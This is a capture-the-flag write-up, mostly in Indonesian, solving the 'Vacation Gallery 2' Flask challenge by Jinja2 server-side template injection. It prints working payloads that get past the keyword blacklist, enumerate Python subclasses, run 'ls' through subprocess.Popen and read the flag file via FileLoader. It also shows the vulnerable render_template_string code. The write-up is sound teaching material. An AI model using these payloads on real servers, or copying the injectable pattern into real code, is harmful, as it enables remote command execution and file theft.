## Challenge Name: Vacation Gallery 2  
>Category: Web Exploitation

>Points: 481

>Solves: 11

### Challenge Description: 

My friend just came back from a vacation in the Austrian Alps, Munich, and Weimar. Check out her photos!

Original Author: sl0ck

http://34.101.174.85:10011/ 

Artifact Files:
* [main.py](https://ctf.compfest.id/files/b375b207a53428722554be9b300b53f0/main.py?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MzV9.ZOV0BA.BEgnmYLgN1fG-vfYLXhLxna2EK8)

### Approach

**1. Analyze the website?**

Mari kita coba buka websitenya
![website](Vacation%20Gallery%202-1.png)
Hanya web standar yang memiliki search bar dan gambar.

**2. Analyze ```main.py``` File**

Berikut isi file ```main.py```:
```
import re
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

s = {
    "austria-1": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/872209040694972416/20210803_140556.jpg",
        "title": "The woods and fallen log in the Austrian Alps"
    },
    "austria-2": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/872209041458343996/20210803_140551.jpg",
        "title": "Pretty scenery in the Austrian Alps 1"
    },
    "austria-3": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/872209042179756082/20210803_110342.jpg",
        "title": "Pretty scenery in the Austrian Alps 2"
    },
    "munchen-1": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/898209515353296896/20211014_123744.jpg",
        "title": "Early flying machines from the Deutsches Museum"
    },
    "munchen-2": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/898212502024900619/20211014_161417.jpg",
        "title": "Street buildings of Munich"
    },
    "goethe": {
        "url": "https://cdn.discordapp.com/attachments/803887398105776168/999523569904140288/6d22649e-eaec-46d9-a788-e34c22421f5d.jpg",
        "title": "Manuscripts from the Goethe Gartenhaus"
    }
}

def check(string):
    blacklist = ["__init__", "__globals__", "nl", "subprocess", "config", " ", r"{{", "update", "lipsum"]
    for word in blacklist:
        if re.search(word, string):
            return False
    return True

@app.route("/", methods=["POST", "GET"])
def home():
    cont = {}
    if request.method == "POST":
        if not "search" in request.form or not request.form["search"]:
            cont["status"] = "no_query"
            cont["images"] = s
            return render_template("index.html", context=cont)
            
        query = request.form["search"]
        
        if len(query) >= 120:
            cont["status"] = "over_limit"
            return render_template("index.html", context=cont)
        
        if not check(query) or re.search(r"{{[^A-Za-z].*}}", query):
            cont["status"] = "red_alert"
            return render_template("index.html", context=cont)

        for i in s:
            if re.search(f"{query}", s[i]["title"], flags=re.IGNORECASE):
                if not "images" in cont:
                    cont["images"] = {}
                cont["images"][i] = s[i]
                
        if not cont:
            cont["status"] = "not_found"
        else:
            cont["status"] = "found"
            cont["found"] = len(cont["images"])
            
        cont["query"] = query
        ret = render_template("index.html", context=cont)
        return render_template_string(ret)
        
    cont["status"] = "get"
    cont["images"] = s
    return render_template("index.html", context=cont)
    
if __name__ == "__main__":
    app.run("0.0.0.0", port=1337)
```
Dari file ini terlihat, server dari website ini menggunakan flask. Hanya ada 1 endpoint yakni `/` yang bisa diakses menggunakan method ```GET``` atau ```POST```. Jika via ```GET``` maka akan return halaman awal yang kita buka tadi. Namun bila ```POST```, maka akan dilakukan pemeriksaan untuk memastikan:
1. Ada key ```search``` di payload
2. Panjang total value dari key ```search``` kurang dari 120 bytes.
3. Payload tidak mengandung string terlarang seperti "__init__", "__globals__", "nl", "subprocess", "config", " ", r"{{", "update", "lipsum", serta substring yang memenuhi regex ```{{[^A-Za-z].*}}```.


Jika semua lancar, maka akan melakukan filtering data berdasarkan ```search``` query. Terakhir, baik bila pengecekan sukses atau gagal, hasil akhirnya akan dimasukkan ke template HTML untuk dihidrasi. 

Dari sini sepertinya mulai tercium potensi exploit. Karena data hasil filter akan dimasukkan ke template HTML, sepertinya kita bisa melakukan injeksi kode ke sana menggunakan injeksi kode. Lalu, dilihat dari keyword yang di-_banned_, sepertinya ini bukan ```XSS``` karena keyword yang di-_banned_ itu keyword python semua. Kalau ini challenge ```XSS```, ngapain coba di-_banned_ toh bisa buat ```XSS``` pake javascript sehingga kemungkinan besar ini challenge perlu injeksi kode python buat baca sesuatu di server.

**3. Find the Exploit Entry Point**

Karena kita tahu bahwa kemungkinan celahnya ada di search bar. Sekarang kita coba cek dulu hipotesis kita. Coba kita masukkan ```1+2```:
![failed](Vacation%20Gallery%202-2.png)
Sepertinya tidak ngefek.

Bentar ku baru nyadar, sepertinya kalo kita masukin ```1+2```, ini akan di-_treat_ sebagai string bukan expression alias make (```{{}}```) templating. Templating ini keknya cuma pass string aja,bukan kode. Artinya kita buat penanda buat nandain yang kita masukin itu kode.

Setelah searching, nemu [ini](https://stackoverflow.com/questions/71494764/python-jinja-template-for-insert-statement). Jadi teh, di Jinja technically bisa insert kode python pake format: ```{% kode %}```. Mungkin kita bisa coba ini. Coba kita masukkan:
```
{%1+2%}
```
Berikut hasilnya:
![not yet](Vacation%20Gallery%202-3.png)
Lah kena 500 dong. Hmm tapi setidaknya berarti ini ngefek sampe bikin servernya kena error.

Bentar, tapi kenapa bisa eror ya. Apa karena output  hasil evaluasinya gak bisa ditampilin gitu jadi error. Coba kalau pake print:
```
{%print(1+2)%}
```
Hasil:
![tembus](Vacation%20Gallery%202-4.png)
Jalan dong dan keevaluasi. Berarti ini bener entry point nya dan kita udah tahu cara nge-_inject_-nya gimana.

**4. Craft Payload to Get List of File**

Karena ku masih kurang tahu cara manggil fungsi buat lihat list of file di direktori, ku cari-cari info di internet.

Setelah ku cari-cari ku nemu website [ini](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) yang berisi tips and trick melakukan injeksi template di ```jinja2``` (templating engine Flask).

Setelah melakukan uji coba beberapa kombinasi, ku menemykan bahwa dengan potongan kode berikut:
```
{%print(dict.__base__.__subclasses__()[idx])%}
```
Kita bisa mengakses fungsi bawaan python yang secara otomatis berada di kelas ```object```. Masalahnya adalah, ```idx``` buat fungsi yang sesuai di web yang disebutkan sebelumnya dan di server challenge itu berbeda sehingga ku membuat script di file ```Vacation Gallery 2.py``` untuk mencari kelas yang mempunyai nama ```subprocess.Popen``` untuk mengirimkan command ```ls``` ke server.

Tapi sebelum itu, kita perlu dapat list of class nya. Untuk hal ini, digunakan command berikut:
```
{%print(dict.__base__.__subclasses__())%}
```
Untuk mendapatkan daftar builtin class/method.
![proof](Vacation%20Gallery%202-5.png)

Dari data yang didapatkan, masukkan ke file ```Vacation Gallery 2.py``` hingga isinya menjadi berikut:
```
LIST_OF_FUNCTIONS = """
[<class 'type...
"""
if __name__=='__main__':
    lists = LIST_OF_FUNCTIONS.split(',')
    for i in range(len(lists)):
        if 'subprocess.Popen' in lists[i]:
            print(f"FOUND at index {i}")
```
Lalu kita jalankan dan diperoleh:
```
FOUND at index 364
```
Diperoleh fungsi untuk membuka subprocess terminal berada di indeks **364**. Dengan referensi di web yang disebutkan tadi, berikut payload untuk melihat daftar file di direktori:
```
{%print(dict.__base__.__subclasses__()[364]('ls',shell=True,stdout=-1).communicate()[0].strip())%}
```
Diperoleh:
![list of files](Vacation%20Gallery%202-6.png)
Dari daftar file ini ada file menarik bernama ```c4n_y0u_fUlly_s4y_my_N4m3.txt``` yang kemungkinan berisi flag.

**5. Craft Payload to Get the Flag**

Sekarang tinggal mencari fungsi untuk membuka file.

Setelah searching di internet, ku menemukan repo [ini](https://github.com/TheMaccabees/ctf-writeups/blob/master/HexionCTF2020/Notes/README.md). Dari _writeup_-nya, sepertinya dia menggunakan kelas bawaan bernama ```FileLoader``` untuk membaca file. Mari kita cari kelas tersebut.

Ubah kode di ```Vacation Gallery 2.py``` menjadi:
```
LIST_OF_FUNCTIONS = """
[<class 'type...
"""
if __name__=='__main__':
    lists = LIST_OF_FUNCTIONS.split(',')
    for i in range(len(lists)):
        #if 'subprocess.Popen' in lists[i]:
        if 'FileLoader' in lists[i]:
            print(f"FOUND at index {i}")
```
Jalankan dan diperoleh:
```
FOUND at index 121
```
Mantap, ternyaa ada di indeks **121**.

Sekarang saatnya buat payload. Berdasarkan info dari repo tersebut, berikut _payload_-nya:
```
{%print(dict.__mro__[1].__subclasses__()[121](".",".").get_data('c4n_y0u_fUlly_s4y_my_N4m3.txt'))%}
```
Kelas ```FileLoader``` harus diinstantiasi dulu dengan argumen asal, tapi biar sesuai tema ku pake ```"."``` yang menggambarkan direktori tempat file server berada, lalu memanggil fungsi ```get_data``` dengan parameter nama file yang akan kita buka. Sekarang mari kita coba.  
![flag](Vacation%20Gallery%202-7.png)

Alhamdulillah dapat _flag_-nya:
```
COMPFEST15{s4m3_pr0bl3m_d1ff3r3nt_s0lut10n}
```

### Reflections
Permulaan yang cukup menantang untuk ```Server Side Template Injection``` di ```Jinja```. Selain itu, lumayan menambah ilmu tentang builtin function di python dan ```object``` base class di **Python**.
  

---
[Back to home](../Readme.md)
